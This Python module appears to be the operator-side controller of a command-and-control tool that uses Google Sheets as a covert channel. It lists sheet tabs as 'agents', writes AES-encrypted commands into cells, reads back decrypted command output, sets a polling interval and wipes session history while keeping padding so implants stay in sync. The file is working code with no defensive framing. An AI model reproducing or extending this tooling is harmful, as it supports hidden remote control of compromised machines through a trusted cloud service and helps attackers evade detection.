"""Google Sheets API operations, scoped by active account."""
from googleapiclient.discovery import build

from auth_manager import creds_for, active_email
from constants import COL_CMD, TICKER_CELL, COL_WATERMARK
from crypto_utils import aes_encrypt, aes_decrypt


def _svc(email=None):
    email = email or active_email()
    return build("sheets", "v4", credentials=creds_for(email), cache_discovery=False)


def list_agents(sheet_id: str, email=None):
    meta = _svc(email).spreadsheets().get(spreadsheetId=sheet_id).execute()
    return [
        {"id": s["properties"]["sheetId"],
         "name": s["properties"]["title"],
         "index": s["properties"]["index"]}
        for s in meta.get("sheets", [])
    ]


def resolve_name(sheet_id: str, gid: int, email=None) -> str:
    meta = _svc(email).spreadsheets().get(spreadsheetId=sheet_id).execute()
    for s in meta.get("sheets", []):
        if s["properties"]["sheetId"] == gid:
            return s["properties"]["title"]
    raise ValueError(f"No sheet tab with GID {gid}")


def get_history(sheet_id: str, tab: str, key, email=None):
    """Read A:C, E2 (ticker) and F (watermark sentinels).
    Decrypts using key. Returns (history, ticker_seconds)."""
    svc = _svc(email)
    resp = svc.spreadsheets().values().batchGet(
        spreadsheetId=sheet_id,
        ranges=[f"'{tab}'!A:C", f"'{tab}'!{TICKER_CELL}",
                f"'{tab}'!{COL_WATERMARK}:{COL_WATERMARK}"],
    ).execute()
    vr = resp.get("valueRanges", [])
    rows_raw   = vr[0].get("values", []) if len(vr) > 0 else []
    ticker_raw = vr[1].get("values", [[10]])[0][0] if len(vr) > 1 else 10
    wm_vals    = vr[2].get("values", []) if len(vr) > 2 else []
    watermarks = {i for i, w in enumerate(wm_vals) if w and w[0] == "__PAD__"}

    history = []
    for i, row in enumerate(rows_raw):
        if i in watermarks:
            continue
        raw_cmd = row[0] if len(row) > 0 else ""
        raw_out = row[1] if len(row) > 1 else ""
        raw_ts  = row[2] if len(row) > 2 else ""
        if not raw_cmd or raw_cmd.strip() == "":
            continue
        cmd, out, ts = raw_cmd, raw_out, raw_ts
        encrypted_cmd = False
        if key:
            dec = aes_decrypt(raw_cmd, key)
            if dec is not None:
                cmd, encrypted_cmd = dec, True
            if raw_out:
                d = aes_decrypt(raw_out, key)
                if d is not None: out = d
            if raw_ts:
                d = aes_decrypt(raw_ts, key)
                if d is not None: ts = d
        history.append({
            "row":           i + 1,
            "command":       cmd,
            "output":        out,
            "timestamp":     ts,
            "pending":       bool(raw_cmd and not raw_out),
            "encrypted_cmd": encrypted_cmd,
        })

    try:
        ticker = int(ticker_raw)
    except Exception:
        ticker = 10
    return history, ticker


def next_empty_row(sheet_id: str, tab: str, email=None) -> int:
    resp = _svc(email).spreadsheets().values().get(
        spreadsheetId=sheet_id, range=f"'{tab}'!A:A").execute()
    return len(resp.get("values", [])) + 1


def send_cmd(sheet_id: str, tab: str, command: str, row: int, key, email=None):
    payload = aes_encrypt(command, key) if key else command
    _svc(email).spreadsheets().values().update(
        spreadsheetId=sheet_id,
        range=f"'{tab}'!{COL_CMD}{row}",
        valueInputOption="RAW",
        body={"values": [[payload]]},
    ).execute()


def set_ticker(sheet_id: str, tab: str, seconds: int, email=None):
    _svc(email).spreadsheets().values().update(
        spreadsheetId=sheet_id,
        range=f"'{tab}'!{TICKER_CELL}",
        valueInputOption="RAW",
        body={"values": [[str(seconds)]]},
    ).execute()


def clear_session(sheet_id: str, tab: str, email=None):
    """Wipe visible data but keep row count stable so the agent's row
    pointer stays valid. Sentinel ' ' in A + '__PAD__' in F."""
    svc = _svc(email)
    col_a = svc.spreadsheets().values().get(
        spreadsheetId=sheet_id, range=f"'{tab}'!A:A").execute()
    n = len(col_a.get("values", []))
    if n == 0:
        return
    svc.spreadsheets().values().clear(
        spreadsheetId=sheet_id, range=f"'{tab}'!A:C", body={}).execute()
    svc.spreadsheets().values().clear(
        spreadsheetId=sheet_id, range=f"'{tab}'!F:F", body={}).execute()
    svc.spreadsheets().values().update(
        spreadsheetId=sheet_id, range=f"'{tab}'!A1:A{n}",
        valueInputOption="RAW",
        body={"values": [[" "] for _ in range(n)]}).execute()
    svc.spreadsheets().values().update(
        spreadsheetId=sheet_id, range=f"'{tab}'!F1:F{n}",
        valueInputOption="RAW",
        body={"values": [["__PAD__"] for _ in range(n)]}).execute()


def delete_tab(sheet_id: str, gid: int, email=None):
    _svc(email).spreadsheets().batchUpdate(
        spreadsheetId=sheet_id,
        body={"requests": [{"deleteSheet": {"sheetId": gid}}]},
    ).execute()
